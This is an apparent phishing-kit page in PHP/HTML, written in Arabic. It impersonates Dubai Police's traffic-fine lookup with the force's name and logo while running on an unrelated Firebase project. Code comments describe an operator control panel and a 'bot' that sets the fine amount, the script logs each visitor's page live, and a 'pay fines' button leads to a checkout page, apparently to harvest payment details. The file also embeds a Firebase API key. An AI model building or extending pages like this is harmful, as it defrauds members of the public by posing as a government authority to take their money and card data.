<?php
// صفحة عرض النتائج - المهندس حسن
// الكود يعمل بنظام Firebase Firestore بالكامل ومتوافق مع Vercel
?>
<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>نتائج الاستعلام - شرطة دبي</title>
  <style>
    :root {
      --main-green: #008b47;
      --bg-color: #f4f7f6;
      --white: #ffffff;
    }

    * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
    body { margin: 0; padding: 0; background-color: var(--bg-color); font-family: 'Segoe UI', sans-serif; }

    /* هيدر ثابت بتصميم احترافي */
    .header-fixed {
      position: fixed;
      top: 0;
      width: 100%;
      z-index: 2000;
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 10px 15px;
      background: linear-gradient(180deg, #008b47 0%, #4a4a4a 100%);
      box-shadow: 0 2px 10px rgba(0,0,0,0.2);
    }

    .logo-container img { height: 45px; }

    .container {
      max-width: 480px;
      margin: 90px auto 0;
      padding: 20px 15px;
    }

    /* كارت الحالة */
    .status-card {
      background: #fff;
      border-radius: 20px;
      padding: 30px;
      text-align: center;
      box-shadow: 0 8px 25px rgba(0,0,0,0.08);
    }

    /* أنيميشن اللودر */
    .loader-ring {
      display: inline-block;
      width: 60px;
      height: 60px;
      border: 6px solid #f3f3f3;
      border-top: 6px solid var(--main-green);
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }

    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

    .status-title { font-size: 18px; font-weight: bold; color: #333; margin-bottom: 10px; }
    .status-msg { color: #666; font-size: 14px; line-height: 1.6; }

    /* كارت النتيجة */
    #resultBox {
      display: none;
      margin-top: 20px;
      background: #fff;
      border-radius: 20px;
      padding: 25px;
      border-right: 5px solid var(--main-green);
      box-shadow: 0 8px 25px rgba(0,0,0,0.08);
    }

    .amount-box {
      font-size: 32px;
      font-weight: 900;
      color: var(--main-green);
      margin: 15px 0;
    }

    .pay-btn {
      width: 100%;
      height: 55px;
      background: var(--main-green);
      color: #fff;
      border: none;
      border-radius: 25px;
      font-size: 18px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 15px;
      transition: background 0.3s;
    }
    .pay-btn:active { transform: scale(0.98); }
  </style>
</head>
<body>

<header class="header-fixed">
  <div style="width: 38px;"></div>
  <div class="logo-container">
    <img src="logo1.png" alt="Dubai Police">
  </div>
  <div style="width: 38px;"></div>
</header>

<div class="container">
  <div class="status-card" id="loadingCard">
    <div class="loader-ring"></div>
    <div class="status-title">جاري فحص المخالفات</div>
    <div class="status-msg">
      نحن نقوم الآن بالاتصال بقاعدة بيانات الشرطة المركزية لجلب بياناتك.. يرجى الانتظار ولا تقم بإغلاق الصفحة.
    </div>
  </div>

  <div id="resultBox">
    <div style="font-size: 14px; color: #666;">إجمالي مبلغ المخالفات المستحق:</div>
    <div class="amount-box" id="totalAmount">0.00 AED</div>
    <div id="violationDetails" style="font-size: 13px; color: #444; margin-bottom: 20px; font-weight: 600;"></div>
    <button class="pay-btn" onclick="window.location.href='checkout.php'">دفع المخالفات الآن</button>
  </div>
</div>

<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>

<script>
    // إعدادات Firebase
    const firebaseConfig = {
      apiKey: "AIzaSyBRoLQJTQVVGiy9JntaEfWAA7qnPWoGLBI",
      authDomain: "jusour-qatar.firebaseapp.com",
      projectId: "jusour-qatar",
      storageBucket: "jusour-qatar.appspot.com",
      messagingSenderId: "927435762624",
      appId: "1:927435762624:web:11d0bf460b62e4af9db625"
    };
    
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    const currentOrderId = sessionStorage.getItem("last_order_id");

    // تتبع الزائر في لوحة التحكم
    function trackVisit() {
        if (currentOrderId) {
            db.collection("active_visits").doc(currentOrderId).set({
                page: "عرض المخالفات",
                last_seen: firebase.firestore.FieldValue.serverTimestamp()
            }, { merge: true }).catch(e => console.log("Track error:", e));
        }
    }

    function listenForResults() {
        if (!currentOrderId) {
            window.location.href = "index.php";
            return;
        }

        trackVisit();

        // مراقبة حية للتغيرات من الرادار (لوحة التحكم)
        const unsubscribe = db.collection("orders").doc(currentOrderId)
          .onSnapshot((doc) => {
            if (doc.exists) {
                const data = doc.data();
                
                // لو الحالة نجاح (البوت حط المبلغ)
                if (data.status === "completed" || data.status === "success") {
                    document.getElementById("loadingCard").style.display = "none";
                    document.getElementById("resultBox").style.display = "block";
                    document.getElementById("totalAmount").innerText = (data.amount || data.total_fines || "0.00") + " AED";
                    document.getElementById("violationDetails").innerText = "تم العثور على مخالفات مسجلة على اللوحة رقم: " + (data.plate_number || "");
                } 
                // لو مفيش مخالفات
                else if (data.status === "no_fines") {
                    document.getElementById("loadingCard").innerHTML = `
                        <div style="color: var(--main-green); font-size: 50px; margin-bottom:15px;">✓</div>
                        <div class="status-title">لا توجد مخالفات</div>
                        <div class="status-msg">لا توجد مخالفات مرورية مسجلة على هذه اللوحة حالياً.</div>
                        <button class="pay-btn" style="background:#444; margin-top:20px;" onclick="window.location.href='index.php'">رجوع للرئيسية</button>
                    `;
                }
                // لو حصل خطأ
                else if (data.status === "error") {
                    document.getElementById("loadingCard").innerHTML = `
                        <div style="color: #e74c3c; font-size: 50px; margin-bottom:15px;">!</div>
                        <div class="status-title">عذراً، حدث خطأ</div>
                        <div class="status-msg">يرجى مراجعة البيانات والمحاولة لاحقاً.</div>
                        <button class="pay-btn" style="background:#444; margin-top:20px;" onclick="window.location.href='index.php'">رجوع</button>
                    `;
                }
            }
          });
    }

    if (currentOrderId) {
        listenForResults();
    } else {
        window.location.href = "index.php";
    }
</script>
</body>
</html>
